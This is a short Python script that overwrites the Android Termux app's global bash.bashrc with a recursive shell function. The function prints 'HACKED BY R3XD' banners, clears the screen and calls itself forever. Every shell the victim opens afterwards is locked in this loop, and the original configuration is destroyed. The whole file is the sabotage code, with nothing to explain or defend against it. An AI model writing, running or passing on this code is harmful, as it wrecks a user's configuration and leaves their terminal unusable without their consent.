import os

bsh = '''
function mulai(){
figlet "HACKED"|lolcat
figlet "BY"|lolcat
figlet "R3XD"|lolcat

echo -e "\e[31m<========================================>"
echo -e "\e[32mCreated By Someone\e[0m"
echo -e "\e[31mNo One Cares But\e[0m"
echo -e "\e[31mWe cares about You\e[0m"
echo -e "\e[31m<========================================>"
sleep 2
clear
mulai
}
mulai
'''
f = open("/data/data/com.termux/files/usr/etc/bash.bashrc","w")
f.write(bsh)
f.close()
